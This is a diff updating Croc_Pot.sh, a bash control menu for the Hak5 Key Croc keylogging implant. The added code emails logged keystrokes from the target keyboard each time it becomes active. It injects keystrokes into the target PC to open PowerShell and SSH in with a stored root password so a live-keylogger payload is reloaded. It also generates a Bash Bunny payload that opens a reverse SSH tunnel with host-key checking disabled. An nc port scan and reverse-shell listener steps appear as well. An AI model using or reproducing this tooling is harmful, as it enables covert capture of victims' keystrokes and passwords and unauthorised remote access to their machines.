@@ -5,7 +5,7 @@
 # Description:   Send E-mail, Status of keycroc, Basic Nmap, TCPdump, Install payload,
 #                SSH to HAK5 gear, Reverse ssh tunnel, and more
 # Author:        Spywill
-# Version:       1.7.6
+# Version:       1.7.7
 # Category:      Key Croc
 ##
 ##
@@ -34,8 +34,8 @@ blue='\e[40;34m'
 red='\e[40;31m'
 white='\e[40;97m'
 yellow='\e[40;93m'
-pink="\e[40;35m"
-cyan="\e[40;36m"
+pink='\e[40;35m'
+cyan='\e[40;36m'
 clear='\e[0m'
 ##
 #----Color Functions
@@ -149,32 +149,77 @@ done
 	echo -ne "\n"
 }
 ##
+#----Check /tmp/cc-client-error.log count number or errors
+##
+echo -ne "${yellow}TMP CLIENT-ERROR COUNT: ${clear}${red}$(wc -l < /tmp/cc-client-error.log)${clear}\n"
+##
 #----Change keycroc timezone to local timezone with curl
 ##
 user_agent_random
 croc_timezone=$(curl -Lsf -A "$userAgent" --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=timezone)
 if [ -z "$croc_timezone" ]; then
 	croc_timezone=$(timedatectl | grep -e 'Time zone' | awk {'print $3'})
-	echo -ne "${yellow}Keycroc timezone set for ${croc_timezone}${clear}\n"
+	echo -ne "${yellow}KEYCROC TIMEZONE SET FOR ${clear}${green}${croc_timezone}${clear}\n"
 elif [[ "$croc_timezone" == "$(timedatectl | grep -e 'Time zone' | awk {'print $3'})" ]]; then
 	LED G
-	echo -ne "${yellow}Keycroc timezone set for ${croc_timezone}${clear}\n"
+	echo -ne "${yellow}KEYCROC TIMEZONE SET FOR ${clear}${green}${croc_timezone}${clear}\n"
 else
 	LED SETUP
-	echo -ne "${yellow}Changing Keycroc timezone to ${croc_timezone}${clear}\n"
+	echo -ne "${yellow}CHANGING KEYCROC TIMEZONE TO ${clear}${green}${croc_timezone}${clear}\n"
 	timedatectl set-timezone ${croc_timezone}
 fi
 ##
 #----check if keyboard PRESENT or MISSING with (KEYBOARD) command
 ##
-keyboard_check() {
+function keyboard_check() {
 if [[ $(KEYBOARD) = PRESENT ]]; then
-	echo -ne "${yellow}KEYBOARD: ${clear}${green}PRESENT $(cat /tmp/mode)${clear}\n"
+	echo -ne "\n${yellow}KEYBOARD: ${clear}${green}PRESENT $(cat /tmp/mode)${clear}\n"
 elif [[ $(KEYBOARD) = MISSING ]]; then
-	echo -ne "${yellow}KEYBOARD: ${clear}${red}MISSING${clear}\n"
+	echo -ne "\n${yellow}KEYBOARD: ${clear}${red}MISSING${clear}\n"
 fi
 }
 keyboard_check
+##
+#----Check for root privileges
+##
+echo -ne "${yellow}KEYCROC UID: ${clear}${green}${UID}-${clear}"
+if [ "${UID}" -eq 0 ]; then
+	echo -ne "${green}ROOT ACCESS${clear}\n"
+else
+	echo -ne "${red}NO ROOT ACCESS${clear}\n"
+fi
+##
+#----Croc_Pot file count
+##
+echo -ne "\n${yellow}CROC_POT FILE COUNT: LINES:${clear}${green}$(wc -l /root/udisk/tools/Croc_Pot.sh | awk {'print $1'})${clear}${yellow} WORDS:${clear}${green}$(wc -w /root/udisk/tools/Croc_Pot.sh | awk {'print $1'})${clear}${yellow} CHARACTERS:${clear}${green}$(wc -m /root/udisk/tools/Croc_Pot.sh | awk {'print $1'})${clear}\n"
+##
+#----Number of times Croc_Pot has started up
+##
+function C_P_T() {
+	local c_p_t=/root/udisk/tools/Croc_Pot/Count_Croc_Pot.txt
+	if [[ -e ${c_p_t} ]] ; then
+		LED G
+	else
+		echo $(( i++ )) > ${c_p_t}
+	fi
+local var=$(sed -n 1p ${c_p_t})
+local var=$(( $var + 1 ))
+if [ $var -eq 1 ]; then
+	echo -ne "${yellow}CROC_POT FIRST STARTUP THANK YOU AND ENJOY :) ${clear}${green}${var}${clear}\n\n"
+else
+	echo -ne "${yellow}CROC_POT STARTUP: ${clear}${green}${var}${clear}${yellow} TIMES${clear}${yellow} LAST STARTUP:${clear}${green} $(sed -n 2p ${c_p_t})\n\n"
+fi
+echo -ne "${var}\n$(date +%b-%d-%y-%r)\n" > ${c_p_t} 2> /dev/null
+}
+C_P_T
+##
+#----Quick ckeck info on startup
+##
+echo -ne "${cyan}UID  PID  PPID C STIME TTY    CMD${clear}\n"
+echo -ne "${green}$(ps -ef | grep "Croc_Pot.sh" | awk 'FNR <= 1' | awk '{$7 = ""};1')${clear}\n\n"
+echo -ne "${yellow}CURRENTLY FOUND: ${clear}${green}$(cat /root/udisk/loot/croc_char.log | wc -m) ${clear}${yellow}CHARACTERS IN croc_char.log${clear}\n"
+echo -ne "${yellow}INSTALLED PAYLOADS: ${clear}${green}$(ls /root/udisk/payloads | wc -l)${clear}\n\n"
+echo -ne "${cyan}$(df -h | sed -n '1p' | awk '{ print toupper($0); }')${clear}\n${green}$(df -h | sed -n '2,10p')${clear}\n"
 ##
 #----Check for keycroc save passwd at /tmp/CPW.txt if not enter passwd
 ##
@@ -203,9 +248,9 @@ fi
 #----Croc_Pot title display info
 ##
 	echo -ne "\n\n\e[41;38;5;232;1m${LINE}${clear}
-${green}»»»»»»»»»»»» CROC_POT ««««««««${clear}${yellow}VER:1.7.6${clear}${green}${clear}\e[41;38;5;232m${array[1]}${clear}${yellow} $(hostname) IP: $(awk -v m=20 '{printf("%-20s\n", $0)}' <<< $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-))${clear}$(internet_test)${clear}
-${blue}AUTHOR: ${clear}${yellow}SPYWILL${clear}${cyan}   $(awk -v m=21 '{printf("%-21s\n", $0)}' <<< $(uptime -p | sed 's/up/CROC UP:/g' | sed 's/hours/hr/g' | sed 's/hour/hr/g' | sed 's/,//g' | sed 's/minutes/min/g' | sed 's/minute/min/g'))${clear}\e[41;38;5;232m§${clear}${yellow} $(hostname) VER: $(cat /root/udisk/version.txt) ${clear}${cyan}*${clear}${yellow}TARGET-PC:${clear}${green}$(awk -v m=10 '{printf("%-10s\n", $0)}' <<< $(OS_CHECK))${clear}
-${blue}$(awk -v m=17 '{printf("%-17s\n", $0)}' <<< ${croc_timezone})${clear}${cyan} $(date +%b-%d-%y-%r)${clear}\e[41;38;5;232mΩ${clear}${yellow} KEYBOARD:${clear}${green}$(sed -n 9p /root/udisk/config.txt | sed 's/DUCKY_LANG //g' | sed -e 's/\(.*\)/\U\1/') ${clear}${yellow}ID:${clear}${green}${k_b}${clear}
+${green}»»»»»»»»»»»» CROC_POT ««««««««${clear}${yellow}VER:1.7.7${clear}${green}${clear}\e[41;38;5;232m${array[1]}${clear}${yellow} $(hostname | awk '{ print toupper($0); }') IP: $(awk -v m=20 '{printf("%-20s\n", $0)}' <<< $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-))${clear}$(internet_test)${clear}
+${blue}AUTHOR: ${clear}${yellow}SPYWILL${clear}${cyan}   $(awk -v m=21 '{printf("%-21s\n", $0)}' <<< $(uptime -p | sed 's/up/CROC UP:/g' | sed 's/hours/hr/g' | sed 's/hour/hr/g' | sed 's/,//g' | sed 's/minutes/min/g' | sed 's/minute/min/g'))${clear}\e[41;38;5;232m§${clear}${yellow} $(hostname | awk '{ print toupper($0); }') VER: $(cat /root/udisk/version.txt) ${clear}${cyan}*${clear}${yellow}TARGET-PC:${clear}${green}$(awk -v m=10 '{printf("%-10s\n", $0)}' <<< $(OS_CHECK))${clear}
+${blue}$(awk -v m=17 '{printf("%-17s\n", $0)}' <<< ${croc_timezone^^})${clear}${cyan} $(date +%b-%d-%y-%r | awk '{ print toupper($0); }')${clear}\e[41;38;5;232mΩ${clear}${yellow} KEYBOARD:${clear}${green}$(sed -n 9p /root/udisk/config.txt | sed 's/DUCKY_LANG //g' | sed -e 's/\(.*\)/\U\1/') ${clear}${yellow}ID:${clear}${green}${k_b^^}${clear}
 \e[40;38;5;202m»»»»»»»»»»»» ${clear}${red}KEYCROC${clear}\e[40m-${clear}${red}HAK${clear}\e[40m${array[0]}${clear}\e[40;38;5;202m «««««««««««««${clear}\e[41;38;5;232m${array[2]}${clear}${yellow} TEMP:${clear}${cyan}$(cat /sys/class/thermal/thermal_zone0/temp)°C${clear}${yellow} USAGE:${clear}${cyan}$(awk -v m=6 '{printf("%-6s\n", $0)}' <<< $(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}'))${clear}${yellow}MEM:${clear}${cyan}$(awk -v m=13 '{printf("%-13s\n", $0)}' <<< $(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }'))${clear}
 \e[41;38;5;232;1m${LINE}${clear}\n\n"
 	LED OFF
@@ -372,7 +417,7 @@ done
 ##
 #----display Spinner while waiting for progress
 ##
-displaySpinner() {
+function displaySpinner() {
 local s=1
 while [ "$(ps a | awk '{print $1}' | grep $!)" ]; do
 	local temp=${spinstr#?}
@@ -380,8 +425,8 @@ while [ "$(ps a | awk '{print $1}' | grep $!)" ]; do
 	local spinstr=$temp${spinstr%"$temp"}
 	sleep 0.3
 done
-echo -ne "\r\n"
-echo -ne "${yellow}Progress has finished${clear}\n"
+echo -ne "\r"
+echo -ne "${yellow}Progress has finished${clear}\033[0K\r"
 }
 ##
 #----KeyCroc Log mean/function save to loot/Croc_Pot
@@ -452,8 +497,6 @@ user_email_set() {
 ##
 #----Python variables to change between files when file is created
 ##
-mail_file() {
-	clear
 python_v() {
 	FILE_A_B="file_location_${CHANGE_FILE} ="
 	FILE_B_B="filename_${CHANGE_FILE} = os.path.basename(file_location_${CHANGE_FILE})"
@@ -465,6 +508,8 @@ python_v() {
 	FILE_H_B="msg.attach(part_${CHANGE_FILE})"
 	FILE_I_B="${CHANGE_FILE_A}"
 }
+mail_file() {
+	clear
 ##
 #----Mail User selected file add to python_v variables
 ##
@@ -607,12 +652,11 @@ fi
 read_all ENTER A PERSONAL MESSAGE Y/N AND PRESS [ENTER]
 case $r_a in
 [yY] | [yY][eE][sS])
-	unset MY_MESS_A DEF_MESS
+	unset MY_MESS_A
 	read_all ENTER MESSAGE AND PRESS [ENTER] ; MY_MESS_A=${r_a} ;;
 [nN] | [nN][oO])
-	unset r_a
-	local DEF_MESS=$(perl -e 'print "Croc_Mail---Author: SPYWILL---KEYCROC-HAK5"')
-	local MY_MESS_A=${DEF_MESS} ;;
+	unset MY_MESS_A
+	local MY_MESS_A=$(perl -e 'print "Croc_Mail---Author: SPYWILL---KEYCROC-HAK5"') ;;
 *)
 	invalid_entry ; croc_mail ;;
 esac
@@ -629,8 +673,56 @@ case $a_f in
 *)
 	invalid_entry ; mail_file ;;
 esac
-python_email & displaySpinner Please wait...
-main_menu
+python_email & displaySpinner Please wait... && echo -ne "\n\n"
+##
+#----Mail send e-mail alert when keyboard is activated/activaty
+##
+	echo -ne "$(Info_Screen '
+-Any keyboard activaty will send a E-mail alert and one file
+-Run Continuously in loop PRESS CTRL + C to break loop in terminal
+-Send live keystroke with [/tmp/livekey.txt]
+installed Live_Keystroke.txt payload first
+-default file will be [/root/udisk/loot/croc_char.log]')\n\n"
+read_all SEND E-MAIL ALERT Y/N AND PRESS [ENTER]
+case $r_a in
+[yY] | [yY][eE][sS])
+unset MY_MESS_A
+local i=1
+reset_broken
+if [ -e "/tmp/livekey.txt" ]; then
+	local CHANGE_FILE="F"
+	local CHANGE_FILE_A="'/tmp/livekey.txt'"
+elif [ -e "/root/udisk/loot/croc_char.log" ]; then
+	local CHANGE_FILE="F"
+	local CHANGE_FILE_A="'/root/udisk/loot/croc_char.log'"
+fi
+echo -ne "${yellow}Sending ${CHANGE_FILE_A}${clear}\n" ; sleep 2
+while WAIT_FOR_KEYBOARD_ACTIVITY 0 ; do
+	$((i++)) 2> /dev/null
+	if [ $broken -eq 1 ]; then
+		break ; main_menu
+	else
+		local MY_MESS_A=$(echo -ne "Target keyboard has been activated $(date +%b-%d-%y-%r) COUNT: ${i}")
+		python_v
+		python_email & displaySpinner KEYBOARD HAS BEEN ACTIVATED SENDING E-MAIL Please wait...
+		sleep 10
+	fi
+done &
+while WAIT_FOR_KEYBOARD_INACTIVITY 2 ; do
+	local temp=${spinstr#?}
+	if [ $broken -eq 1 ]; then
+		break ; main_menu
+	else
+		echo -ne "\e[40;3$(( $RANDOM * 6 / 32767 +1 ))m$(printf " [%c] " "$spinstr")${clear}${yellow}KEYBOARD: ${clear}${cyan}INACTIVITE ${clear}${yellow}COUNT: ${clear}${green}$((i++))${clear}\033[0K\r"
+		local spinstr=$temp${spinstr%"$temp"}
+	fi
+done
+trap - SIGINT ; main_menu ;;
+[nN] | [nN][oO])
+	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ; main_menu ;;
+*)
+	invalid_entry ; croc_mail ;;
+esac
 }
 ##
 #----Croc pot plus menu/function
@@ -792,11 +884,11 @@ case $r_a in
 for (( PORT = 1; PORT < $range_port; ++PORT )); do
 	nc -z -w 1 "$n_ip" "$PORT" < /dev/null;
 if [ $? -eq 0 ]; then
-	echo -ne "${green}Open port $PORT${clear}\n"
+	echo -ne "${green}Open port $PORT${clear}\033[0K\r\n"
 elif [ $broken -eq 1 ]; then
 	break
 fi
-done ;;
+done & displaySpinner Scan in progress Please wait... && echo -ne "\n" ;;
 [nN] | [nN][oO])
 	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ; croc_recon ;;
 *)
@@ -6011,7 +6103,7 @@ WAIT_FOR_KEYBOARD_ACTIVITY 0
 -Press anything else will break loop
 -Run this on remote terminal')\n\n"
 local i=1
-	echo -ne "${yellow}ENTER BACKSPACE AT WILL${clear}\n\n"
+	echo -ne "${yellow}PRESS BACKSPACE AT WILL${clear}\n\n"
 	while IFS= read -r -n1 -s backspace; do
 	case ${backspace} in
 	$'\177')
@@ -6878,14 +6970,18 @@ elif [[ \"\$LOOT\" == \"UPARROW\" ]]; then\n	echo -ne \"\\\U2191\" >> /tmp/livek
 elif [[ \"\$LOOT\" == \"DELETE\" ]]; then\n	echo -ne \" DELETE \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"F1\" ]]; then\n	rm /root/udisk/payloads/Live_keystroke.txt\n	RELOAD_PAYLOADS\nelif [[ \"\$LOOT\" == \"F2\" ]]; then\n	echo -ne \" F2 \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"F3\" ]]; then\n	echo -ne \" F3 \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"F4\" ]]; then\n	echo -ne \" F4 \" >> /tmp/livekey.txt\nelif [[ \"\$LOOT\" == \"F5\" ]]; then\n	echo -ne \" F5 \" >> /tmp/livekey.txt\nelse\n	echo -ne \"\$LOOT\" >> /tmp/livekey.txt\nfi\n" >> /root/udisk/payloads/Live_keystroke.txt
 	echo -ne "\n$(ColorGreen 'Live_keystroke PAYLOAD IS NOW INSTALLED CHECK PAYLOADS FOLDER')${clear}\n"
 	echo -ne "\n${LINE}\n" ; cat /root/udisk/payloads/Live_keystroke.txt ; echo -ne "\n${LINE}\n"
-	echo -ne "${yellow}After payload has installed need to reload payload\nChoose manually an enter [ RELOAD_PAYLOADS; exit ] or\nlet target pc terminal reload payload ${clear}\n"
-	read_all CHOOSE AN OPTION TO RELOAD PAYLOAD [M] MANUALLY OR [T] TARGET TERMINAL
-case $r_a in
-	[tT])
 ##
 #----Start second terminal on target pc to reload payload for (Live_Keystroke.txt)
 #----manually enter (RELOAD_PAYLOADS; exit) to reload payload
 ##
+	echo -ne "$(Info_Screen '
+-After payload has installed need to reload payload
+Choose manually enter [ RELOAD_PAYLOADS; exit ] in keycroc terminal
+Choose terminal will open terminal on target pc
+Choose exit will need to unplug keycroc then plug back in')\n\n"
+read_all RELOAD PAYLOAD [M]MANUALLY [T]TARGET TERMINAL [E]EXIT
+case $r_a in
+[tT])
 if [ "$(OS_CHECK)" = WINDOWS ]; then
 	Q GUI d ; Q GUI r ; sleep 1 ; Q STRING "powershell" ; Q ENTER ; sleep 3 ; Q STRING "ssh root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)"
 	Q ENTER ; sleep 2 ; Q STRING "$(sed -n 1p /tmp/CPW.txt)" ; Q ENTER ; sleep 2 ; Q STRING "RELOAD_PAYLOADS; exit" ; Q ENTER ; sleep 1 ; Q STRING "exit" ; Q ENTER ; sleep 1 ; Q GUI d
@@ -6906,13 +7002,23 @@ parrot)
 	WAIT_FOR_KEYBOARD_ACTIVITY 1
 	tail -f /tmp/livekey.txt
 fi ;;
-	[mM])
+[mM])
 	sshpass -p $(sed -n 1p /tmp/CPW.txt) ssh -o "StrictHostKeyChecking no" root@localhost
-	clear
-	echo -ne "\n\t\t${yellow}keystrokes will display here${clear}\n"
-	WAIT_FOR_KEYBOARD_ACTIVITY 1
-	tail -f /tmp/livekey.txt ;;
-	*)
+	read_all START LIVE KEYSTROKE Y/N AND PRESS [ENTER]
+	case $r_a in
+		[yY] | [yY][eE][sS])
+			clear
+			echo -ne "\n\t\t${yellow}keystrokes will display here${clear}\n"
+			WAIT_FOR_KEYBOARD_ACTIVITY 1
+			tail -f /tmp/livekey.txt ;;
+		[nN] | [nN][oO])
+			echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
+		*)
+			invalid_entry ; keystrokes_V ;;
+	esac ;;
+[eE])
+	echo -ne "\n${yellow}Unplug keycroc and plug back in${clear}\n" ; exit ;;
+*)
 	invalid_entry ; keystrokes_V ;;
 esac ;;
 [nN] | [nN][oO])
@@ -7212,7 +7318,7 @@ Other Keystrokes:
 	read_all START TOP Y/N AND PRESS [ENTER]
 case $r_a in
 [yY] | [yY][eE][sS])
-	top ;;
+	top && tput civis ;;
 [nN] | [nN][oO])
 	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
 *)
@@ -7417,9 +7523,10 @@ MenuEnd 25
 function ssh_menu() {
 	clear
 ##
-#----SSH Install sshpass
+#----SSH Install sshpass/check active SSH connection
 ##
 	install_package sshpass SSHPASS ssh_menu
+	echo -ne "${yellow}Active SSH connection:${clear}\n${green}$(ss | grep -i ssh)${clear}\n${green}$(last -a | grep -i still)${clear}\n"
 #
 #----Check and start ssh to hak5 device
 #
@@ -7850,15 +7957,19 @@ case $r_a in
 	echo -ne "\n$(ColorGreen 'Keeping existing Bunny_Payload_Shell')\n" ;;
 [nN] | [nN][oO])
 	rm ${bunny_payload_v}
-	echo -ne "# Title:         Bash Bunny Payload\n# Description:   Reverse Tunnel to keycroc\n# Author:        Spywill\n# Version:       1.0
-# Category:      Bash Bunny\n#\n#ATTACKMODE RNDIS_ETHERNET\nATTACKMODE ECM_ETHERNET\nsleep 10\nssh -fN -R 7000:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)\nLED ATTACK" | tee ${bunny_payload_v}
+	echo -ne "# Title:         Bash Bunny Payload\n# Description:   Reverse Tunnel to keycroc, check for sshpass\n# Author:        Spywill\n# Version:       1.1
+# Category:      Bash Bunny\n#\n#ATTACKMODE RNDIS_ETHERNET\nATTACKMODE ECM_ETHERNET\n#ATTACKMODE AUTO_ETHERNET\nsleep 30\nuntil wget -q --spider http://google.com; do\n	LED R\n	sleep 1\ndone\nLED G\nstatus=\"\$(dpkg-query -W --showformat='\${db:Status-Status}' sshpass 2>&1)\"
+if [ ! \$? = 0 ] || [ ! \"\$status\" = installed ]; then\n	LED SETUP\n	apt -y install sshpass\n	LED G\nelse\n	LED G\nfi
+until sshpass -p $(sed -n 1p /tmp/CPW.txt) ssh -fN -R 7000:localhost:22 -o \"StrictHostKeyChecking no\" root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) 2> /dev/null; do\n	LED R\n	sleep 1\ndone\nLED ATTACK" | tee ${bunny_payload_v}
 	echo -ne "\n${green}Bunny Reverse Tunnel payload is created check tools/Bunny_Payload_Shell folder${clear}\n" ;;
 *)
 	invalid_entry ; ssh_bunny ;;
 esac
 else
-	echo -ne "# Title:         Bash Bunny Payload\n# Description:   Reverse Tunnel to keycroc\n# Author:        Spywill\n# Version:       1.0
-# Category:      Bash Bunny\n#\n#ATTACKMODE RNDIS_ETHERNET\nATTACKMODE ECM_ETHERNET\nsleep 10\nssh -fN -R 7000:localhost:22 root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)\nLED ATTACK" | tee ${bunny_payload_v}
+	echo -ne "# Title:         Bash Bunny Payload\n# Description:   Reverse Tunnel to keycroc, check for sshpass\n# Author:        Spywill\n# Version:       1.1
+# Category:      Bash Bunny\n#\n#ATTACKMODE RNDIS_ETHERNET\nATTACKMODE ECM_ETHERNET\n#ATTACKMODE AUTO_ETHERNET\nsleep 30\nuntil wget -q --spider http://google.com; do\n	LED R\n	sleep 1\ndone\nLED G\nstatus=\"\$(dpkg-query -W --showformat='\${db:Status-Status}' sshpass 2>&1)\"
+if [ ! \$? = 0 ] || [ ! \"\$status\" = installed ]; then\n	LED SETUP\n	apt -y install sshpass\n	LED G\nelse\n	LED G\nfi
+until sshpass -p $(sed -n 1p /tmp/CPW.txt) ssh -fN -R 7000:localhost:22 -o \"StrictHostKeyChecking no\" root@$(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) 2> /dev/null; do\n	LED R\n	sleep 1\ndone\nLED ATTACK" | tee ${bunny_payload_v}
 	echo -ne "\n${green}Bunny Reverse shell payload is created check tools/Bunny_Payload_Shell folder${clear}\n"
 fi
 ##
@@ -7962,7 +8073,7 @@ remote_listener() {
 	echo -ne "$(Info_Screen '
 -Start a reverse shell with netcat on keycroc
 -Remotely access keycroc from a remote-server
--Frist On the listening remote-server enter this below
+-First On the listening remote-server enter this below
 -->nc -lnvp PORT# -s IP OF LISTENING REMOTE-SERVER
 -On Keycroc Enter ip of the listening remote-server and port number
 -Keycroc side will be setup as below
@@ -8707,7 +8818,7 @@ quick_cloud() {
 	clear
 	local quickcloud=/root/udisk/payloads/Quick_Start_C2.txt
 	echo -ne "$(Info_Screen '
--Will need to install Cloud C2 frist on the keycroc
+-Will need to install Cloud C2 first on the keycroc
 -This will install Quick_Start_C2.txt in the payload folder
 -Use this to start C2 from a payload
 -Type in startc2 this will automatically start Hak5 cloud C2')\n"
@@ -8774,7 +8885,7 @@ fi
 ##
 restore_ip() {
 	clear
-	echo -ne "\n$(ColorYellow 'This will restore keycroc IP back to the IP when C2 was frist setup')\n"
+	echo -ne "\n$(ColorYellow 'This will restore keycroc IP back to the IP when C2 was first setup')\n"
 if [ -e "${cloud_ip}" ]; then
 	echo -ne "$(ColorYellow 'Keycroc IP will change to this IP now  ')$(sed -n 1p ${cloud_ip})\n"
 	echo -ne "$(ColorYellow 'Will need to start new ssh with this IP')$(sed -n 1p ${cloud_ip})\n"
